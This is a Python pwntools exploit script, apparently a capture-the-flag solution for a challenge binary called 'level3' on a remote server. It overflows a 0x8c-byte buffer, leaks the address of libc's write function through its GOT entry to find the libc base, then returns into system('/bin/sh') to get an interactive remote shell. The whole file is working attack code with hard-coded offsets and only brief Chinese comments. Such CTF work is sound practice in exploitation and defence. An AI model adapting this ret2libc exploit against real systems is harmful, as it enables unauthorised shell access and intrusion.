from pwn import *

context.log_level = 'DEBUG'

# p = process('../file/level3') # 本地调试是失败的，因为用的libc库不同
p = remote('61.147.171.105', '49611')

input('continue?')

write_plt = 0x08048340
write_got = 0x0804a018
main_address = 0x08048484
libc_write_address = 0x000d43c0

payload = flat(
    b'a' * 0x8c,
    write_plt, # 跳转地址
    main_address, # 返回地址
    1, # 参数1
    write_got, # 参数2
    4, # 参数3
)
print(payload)
p.sendlineafter(b'Input:\n', payload)

libc_base_address = u32(p.recv(4)) - libc_write_address
print(libc_base_address)

libc_system_address = 0x0003a940 + libc_base_address
libc_binsh_address = 0x0015902b + libc_base_address
payload = flat(
    b'a' * 0x8c,
    libc_system_address, # 跳转地址
    1234, # 返回地址
    libc_binsh_address, # 参数1
)
p.sendlineafter(b'Input:\n', payload)

p.interactive()